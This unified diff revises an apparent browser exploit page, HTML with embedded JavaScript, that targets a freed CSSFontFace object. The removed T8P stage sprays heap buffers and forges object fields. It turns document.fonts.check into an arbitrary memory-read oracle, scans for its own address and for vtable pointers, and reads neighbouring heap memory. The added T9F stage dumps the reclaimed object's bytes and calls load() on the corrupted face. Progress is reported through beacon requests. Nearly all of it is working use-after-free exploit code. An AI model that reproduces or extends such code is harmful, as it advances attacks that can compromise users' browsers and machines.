@@ -1,17 +1,14 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>T8P</title></head>
-<body><pre id="O">T8M</pre>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T9F</title></head>
+<body><pre id="O">T9F</pre>
 <script>
 'use strict';
-function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T8P-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T9F-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
 bs('BOOT');
 var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;
 
 function le48(v,o){return v[o]+v[o+1]*0x100+v[o+2]*0x10000+v[o+3]*0x1000000+v[o+4]*0x100000000+v[o+5]*0x10000000000;}
 function hex(x){return '0x'+Math.round(x).toString(16);}
 function hx(x){return x.toString(16);}
-function wr48(u,o,x){for(var k=0;k<6;k++){u[o+k]=x%256;x=Math.floor(x/256);}u[o+6]=0;u[o+7]=0;}
-function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
-function align256(x){return Math.floor(x/256)*256;}
 
 window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));
 
@@ -57,164 +54,52 @@ function phase(){
   if(!bufs.length){bs('NOLEAK');return;}
   var h0=bufs[0][0];
 
-  for(var ib=0;ib<bufs.length;ib++){
-    var vb=bufs[ib][0];
-    vb[0]=2;wr48(vb,0x08,bufs[ib][1]);wr48(vb,0x10,0);vb[0x82]=0;
-    wr48(vb,0x20,0);put32(vb,0x28,0);put32(vb,0x2C,0);
+  // dump RAW h0 BEFORE any oracle setup (freed CSSFontFace + our spray bytes)
+  function dh(off,len){var s='';for(var d=0;d<len;d++){var b=h0[off+d];s+=(b<16?'0':'')+b.toString(16);}return s;}
+  bs('R00='+dh(0,16));
+  bs('R10='+dh(0x10,16));
+  bs('R20='+dh(0x20,16));
+  bs('R30='+dh(0x30,16));
+  bs('R40='+dh(0x40,16));
+  bs('R50='+dh(0x50,16));
+  bs('R60='+dh(0x60,16));
+  bs('R70='+dh(0x70,16));
+  bs('R80='+dh(0x80,16));
+
+  // DON'T do oracle setup — leave h0 untouched
+  // only rename faces and add to document.fonts (required for load())
+  bs('FACES='+faces.length);
+  var zi=-1;
+  for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+  for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+  // find the oracle face (the one backed by our buffer)
+  for(var q=0;q<faces.length;q++){
+    try{
+      var st=faces[q].status;
+      bs('F'+q+'='+st);
+      if(st==='error'||st==='unloaded'){zi=q;break;}
+    }catch(e){bs('F'+q+'=EX');}
   }
-  setTimeout(function(){
-    bs('FACES='+faces.length);
-    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
-    setTimeout(function(){
-      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
-      setTimeout(function(){
-        var zi=-1;
-        for(var q=0;q<faces.length;q++){
-          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
-          if(r===false){zi=q;break;}
-        }
-        bs('ZI='+zi);
-        if(zi<0){bs('NOORACLE');return;}
+  bs('ZI='+zi);
 
-        function setR(addr){for(var ir=0;ir<bufs.length;ir++)wr48(bufs[ir][0],0x20,addr);}
-        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}
+  // dump AFTER rename+add (what did the engine change?)
+  bs('A00='+dh(0,16));
+  bs('A08='+dh(0x08,8));
+  bs('A18='+dh(0x18,8));
+  bs('A82='+dh(0x80,4));
 
-        for(var ip=0;ip<bufs.length;ip++){
-          bufs[ip][0][0x82]=0;
-          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
-          wr48(bufs[ip][0],0x20,L2);
-        }
-        put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xCAFE);
-        for(var ip2=1;ip2<bufs.length;ip2++){
-          put32(bufs[ip2][0],0x38,0x1000);put32(bufs[ip2][0],0x3C,0x2000);
-        }
-
-        bs('SCAN1');
-        var self=0,n3=0;
-        var anchors=[align256(L1),align256(L2)];
-        for(var an=0;an<anchors.length&&!self;an++){
-          var cS=anchors[an]-0x400000,cE=anchors[an]+0x400000;
-          if(cS<0x10000)cS=0x10000;
-          for(var a=cS;a<cE&&!self;a+=128){
-            setR(a+0x38);n3++;
-            if(chk(0xBEEF)===true&&chk(0xBEEE)===false&&chk(0xCAFE)===true&&chk(0xCAFF)===false){
-              self=a;bs('SELF='+hex(a));
-            }
-          }
-        }
-        bs('SCAN1-END-n='+n3);
-        if(!self){bs('NOSELF');return;}
-
-        function rr(addr){
-          setR(addr);
-          var c0=chk(0),cM=chk(0x10FFFF);
-          if(c0&&cM)return[0,0x10FFFF];
-          if(c0){
-            var lo=0,hi=0x10FFFF;
-            while(lo<hi){var m=(lo+hi+1)>>>1;if(chk(m))lo=m;else hi=m-1;}
-            return[0,lo];
-          }
-          if(cM){
-            var lo2=0,hi2=0x10FFFF;
-            while(lo2<hi2){var m2=(lo2+hi2)>>>1;if(chk(m2))hi2=m2;else lo2=m2+1;}
-            return[lo2,0x10FFFF];
-          }
-          var seed=-1,v=1;
-          while(v<=0x10FFFF){
-            if(chk(v)){seed=v;break;}
-            var v3=v+v+v;
-            if(v3<=0x10FFFF&&chk(v3)){seed=v3;break;}
-            v=v*2;
-          }
-          if(seed<0)return[-2,-2];
-          var lo3=0,hi3=seed;
-          while(lo3<hi3){var m3=(lo3+hi3)>>>1;if(chk(m3))hi3=m3;else lo3=m3+1;}
-          var fr=lo3;
-          var lo4=seed,hi4=0x10FFFF;
-          while(lo4<hi4){var m4=(lo4+hi4+1)>>>1;if(chk(m4))lo4=m4;else hi4=m4-1;}
-          return[fr,lo4];
-        }
-        function rf(r){return r[0]===-2?'E':hx(r[0])+'/'+hx(r[1]);}
-        function s6p(rv){
-          if(rv[0]===-2||(rv[0]===0&&rv[1]===0x10FFFF))return 0;
-          var f=rv[0],t=rv[1];
-          return((f>>>16)&0xFF)+((f>>>24)&0xFF)*256+(t&0xFF)*65536+((t>>>8)&0xFF)*16777216+((t>>>16)&0xFF)*4294967296+((t>>>24)&0xFF)*1099511627776;
-        }
-
-        // VERIFY write primitive (power-of-2 values)
-        put32(h0,0x90,0x100);put32(h0,0x94,0x200);
-        var vr=rr(self+0x90);
-        var vok=(vr[0]===0x100&&vr[1]===0x200);
-        bs('VERIFY='+rf(vr)+(vok?'=OK':'=FAIL'));
-        h0[0x90]=0;h0[0x91]=0;h0[0x92]=0;h0[0x93]=0;
-        h0[0x94]=0;h0[0x95]=0;h0[0x96]=0;h0[0x97]=0;
-        if(!vok){bs('DONE');return;}
-
-        // PHASE A: vtable scan ±1024 around L1 AND L2
-        var bestVT=0,bestCnt=0;
-        var bases=[L1,L2,0x1000150000];
-        for(var bi=0;bi<bases.length;bi++){
-          for(var ni=-1024;ni<=1024;ni+=8){
-            var na=bases[bi]+ni;
-            if(na<0x10000)continue;
-            var tr=rr(na+4);
-            if(tr[0]===-2)continue;
-            if((tr[0]&0xFF)!==8)continue;
-            var vt=s6p(rr(na-2));
-            if(vt<0x810000000||vt>0x900000000)continue;
-            var cnt=0;
-            for(var si=0;si<224;si+=8){
-              var st=rr(vt+si+4);
-              if(st[0]===-2)break;
-              if((st[0]&0xFF)===8)cnt++;
-            }
-            bs('VT='+hex(vt)+'-cnt='+cnt+'-ni='+ni+'-b='+bi);
-            if(cnt>bestCnt){bestCnt=cnt;bestVT=vt;}
-          }
-        }
-        bs('BEST='+hex(bestVT)+'-cnt='+bestCnt);
-        if(!bestVT||bestCnt<2){bs('NOVT');
-          put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xCAFE);setR(self+0x38);
-          bs('DONE');return;}
-
-        // PHASE B: write vtable addr at +0x00, verify via s6p
-        wr48(h0,0x00,bestVT);
-        var rb4=rr(self+4);
-        bs('VTP-b4='+rf(rb4));
-        var rvt=s6p(rr(self-2));
-        var vtok=(rvt===bestVT);
-        bs('VTP='+hex(bestVT)+'-READ='+hex(rvt)+(vtok?'=HIT':'=MISS'));
-
-        // PHASE C: heap neighborhood scan
-        // C1: forward — next 128 bytes past our 192-byte buffer
-        var fw='';
-        for(var i=0;i<8;i++){
-          var off=0xC0+i*8;
-          var rv=rr(self+off);
-          fw+=hx(off)+'='+rf(rv)+' ';
-        }
-        bs('FWD='+fw.trim());
-        // C2: backward — 64 bytes before our buffer
-        var bw='';
-        for(var i=1;i<=8;i++){
-          var off=i*8;
-          var rv=rr(self-off);
-          bw+=hx(off)+'='+rf(rv)+' ';
-        }
-        bs('BWD='+bw.trim());
-        // C3: try s6p on first field of next alloc
-        var nx=s6p(rr(self+0xC0-2));
-        bs('NX0='+hex(nx));
-        // C4: try s6p at self-8 (allocator header?)
-        var ph=s6p(rr(self-8-2));
-        bs('PH='+hex(ph));
-
-        put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xCAFE);setR(self+0x38);
-        bs('DONE');
-        document.getElementById('O').textContent='T8P DONE';
-      },50);
-    },50);
-  },50);
+  if(zi<0){bs('NOFACE');bs('DONE');return;}
+  // try face.load() with untouched struct
+  bs('LOADING');
+  try{
+    var lp=faces[zi].load();
+    bs('LOAD-OK');
+  }catch(e){
+    bs('LOAD-EX='+(''+e).substring(0,80));
+  }
+  bs('P82='+dh(0x80,4));
+  bs('DONE');
+  document.getElementById('O').textContent='T9F DONE';
 }
 if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
 else document.addEventListener('DOMContentLoaded',start);
